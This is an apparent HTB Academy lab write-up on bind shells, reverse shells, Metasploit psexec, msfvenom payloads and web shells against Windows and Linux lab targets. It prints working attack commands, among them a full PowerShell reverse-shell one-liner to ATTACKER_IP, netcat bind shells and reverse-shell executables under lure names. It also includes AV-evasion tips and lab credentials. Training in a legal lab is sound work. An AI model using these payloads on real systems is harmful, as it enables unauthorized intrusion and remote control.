CAT5 / Inlanefreight – Shells & Payloads

Difficulty: Intermediate Category: Tactics / Shells & Payloads Platform: HTB Academy Date: March 2026

Action log and walk-through covering bind shells, reverse shells, payload generation, and web shells on Windows and Linux targets.

1 / 17 – Engagement Context

  • I assumed the role of a Junior Pentester at CAT5 Security.
  • My target environment is Inlanefreight (legal HTB lab).
  • My objectives:
    • Execute bind and reverse shells.
    • Deploy Metasploit and MSFvenom payloads.
    • Compromise Linux, Windows, and web applications.

2 / 17 – Shells vs Payloads Setup

  • I use shells to interact with the OS after gaining access.
    • Linux targets: bash, sh.
    • Windows targets: cmd.exe, powershell.exe.
  • I use payloads as the delivery mechanism to establish the shell.
    • I generate payloads via Metasploit or MSFvenom.

3 / 17 – Environment Preparation

  • I checked my local Pwnbox configuration.
  • I verified my cross-platform PowerShell version.
$PSVersionTable
  • I noted that initial shells will be non-interactive.
  • I will need to upgrade them to interactive TTY shells to use sudo or vim.

4 / 17 – Executing Bind Shells

  • I configured the victim to open a port and wait for my connection.
  • I connected from my attack box to the open port.

Linux Target (with -e):

# Executed on Victim nc -lvnp 4444 -e /bin/bash # Executed on Attack Box nc <victim-ip> 4444

Linux Target (without -e support):

# Executed on Victim (mkfifo trick) mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f # Executed on Attack Box nc <victim-ip> 4444
Note: Bind shells often fail against real firewalls. I prefer reverse shells for actual engagements.

5 / 17 – Executing Reverse Shells (Windows Lab)

  • Target: 10.129.11.9 (ACADEMY-SHELLS-WIN10).
  • I set up my attack box to listen for incoming connections.
  • I executed a payload on the victim to dial back to my IP.

Step 1: Start Listener

nc -lvnp 4444

Step 2: Execute PowerShell Payload on Target

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
  • Challenge: Entering the complex PowerShell one-liner accurately without triggering syntax or character escaping errors in the Windows command line.
  • Solution: I built and verified the payload locally on my attack box first. I then copied it via the RDP shared clipboard directly into the target's prompt to avoid typos.

6 / 17 – Payload Generation Workflow

  • I used Metasploit for direct exploitation.
  • I used MSFvenom to generate standalone files.

Metasploit Flow:

msfconsole use <exploit/module> set RHOSTS <target-ip> set RPORT <port> set PAYLOAD <payload/name> set LHOST <tun0-ip> set LPORT <my-port> run
Payload Selection & Evasion:
- I use Staged payloads when exploit buffer space is restricted.
- I use Stageless payloads for stability over bad networks.
- If AV detects my payload, I switch to memory-only execution (living off the land), generate raw shellcode for injection, or use basic encoding wrappers.

7 / 17 – Psexec Exploitation Walk-through

  • Target: 10.129.201.160.
  • I obtained valid SMB credentials: htb-student / HTB_@cademy_stdnt!
  • I loaded the psexec module in Metasploit.
use exploit/windows/smb/psexec set RHOSTS 10.129.201.160 set SMBUser htb-student set SMBPass HTB_@cademy_stdnt! set LHOST 10.10.15.191 set LPORT 4444 exploit
  • I successfully caught a SYSTEM Meterpreter shell.
  • Decision: I chose a staged Meterpreter payload (windows/meterpreter/reverse_tcp) because the psexec module manages the staging process automatically and I wanted immediate access to advanced post-exploitation commands.
  • I navigated to C:\Users\htb-student\Documents.
  • Challenge: Navigating a Windows file system using Meterpreter-specific commands rather than standard native CMD tools.
Flag Retrieval: I executed search -f [REDACTED].txt in Meterpreter. I read the file to capture the flag.

8 / 17 – Creating Standalone Binaries (MSFvenom)

  • I needed payloads for targets without direct exploit vectors.
  • I listed available modules using msfvenom -l payloads.
  • Decision: I generated stageless payloads to avoid secondary download stages, increasing reliability for manual execution.
  • AV Bypass Strategy: If Defender kills these raw executables, I generate raw shellcode (-f raw or -f csharp) and write a custom runner to execute it in memory.

Generated Linux ELF:

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

Generated Windows EXE:

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
  • I set up local netcat listeners and waited for the victim to execute the files.

11 / 17 – Upgrading to Interactive Shells

  • My initial exploit shells were restricted (no prompt, broken formatting).
  • Decision Tree:
    1. Check for python3 or python to spawn a PTY.
    2. If Python is missing, try using the script binary.
    3. If all local tools fail, upload a statically compiled socat binary to force a stable TTY.
  • I used Python to spawn a fully interactive PTY.
python -c 'import pty; pty.spawn("/bin/sh")' # If python3 is the only version available: python3 -c 'import pty; pty.spawn("/bin/bash")'
  • This restored my ability to use command history, su, and reliable text editors.
script /dev/null -c bash

12 / 17 – Deploying Web Shells

  • I use web shells when standard reverse shells fail due to strict egress filtering.
  • I exploit a vulnerability (like file upload) to drop a server-side script.
  • I access the script via HTTP to execute OS commands.
  • I match the shell to the environment: PHP for Linux/Apache, ASPX for Windows/IIS.
  • These shells run as low-privilege service accounts (e.g., www-data).

13 / 17 – Laudanum ASPX Shell Walk-through

  • Target: 10.129.42.197 (Windows Server 2019, IIS 10.0).
  • I identified an upload form at status.inlanefreight.local.
  • I copied the Laudanum ASPX shell from my Kali build.
cp /usr/share/laudanum/aspx/shell.aspx /home/htb-student/demo.aspx
  • I edited the file to whitelist my attack IP.
  • I uploaded the shell via the web app.
  • I executed the shell by navigating to http://status.inlanefreight.local/files/demo.aspx.
  • Challenge: Understanding that the IIS worker process directory (where commands execute) differs from the web root directory (where the payload is stored).
